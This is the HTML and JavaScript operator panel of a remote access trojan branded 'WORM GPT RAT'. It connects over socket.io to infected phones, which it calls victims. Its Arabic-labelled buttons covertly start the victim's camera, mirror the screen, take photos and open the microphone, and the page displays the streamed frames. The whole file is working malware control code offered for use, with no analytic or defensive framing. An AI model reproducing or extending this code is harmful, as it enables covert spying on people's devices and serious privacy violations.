<!DOCTYPE html>
<html>
<head>
    <title>WORM GPT - ADVANCED PANEL</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { background: #0a0a0a; color: #ff0000; font-family: sans-serif; text-align: center; }
        .box { border: 2px solid #ff0000; padding: 20px; margin: 10px; display: inline-block; background: #1a1a1a; }
        button { background: #ff0000; color: white; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; margin: 5px; }
        button:hover { background: #aa0000; }
        #liveView { width: 80%; max-width: 600px; border: 5px solid #333; margin-top: 20px; }
        .status { color: #00ff00; font-size: 1.2em; }
    </style>
</head>
<body>
    <h1>WORM GPT RAT - CONTROL CENTER</h1>
    <p>Status: <span id="stat" class="status">Waiting for Victim...</span></p>

    <div class="box">
        <h3>LIVE MONITOR</h3>
        <img id="liveView" src="" alt="Waiting for stream data...">
    </div>

    <br>

    <div class="box">
        <h3>REMOTE ACTIONS</h3>
        <button onclick="sendCommand('start_camera')">بث كاميرا مباشر 📸</button>
        <button onclick="sendCommand('start_screen')">مشاهدة الشاشة مباشر 📱</button>
        <button onclick="sendCommand('take_photo')">التقاط صورة سريعة 🖼️</button>
        <button onclick="sendCommand('start_audio')">فتح الميكروفون 🎙️</button>
        <button onclick="stopAll()">إيقاف كل العمليات 🛑</button>
    </div>

    <script>
        const socket = io();

        // استقبال التبليغ
        socket.on('new_victim_alert', (data) => {
            document.getElementById('stat').innerText = "Connected to: " + data.model;
        });

        // استقبال فريمات الفيديو (كاميرا أو شاشة) وعرضها
        socket.on('display_frame', (data) => {
            document.getElementById('liveView').src = "data:image/jpeg;base64," + data.frame;
        });

        // إرسال الأوامر للهاتف
        function sendCommand(cmd) {
            socket.emit('admin_command', { command: cmd });
            console.log("Sent command: " + cmd);
        }

        function stopAll() {
            location.reload(); // لإيقاف الاستقبال من المتصفح
        }
    </script>
</body>
</html>
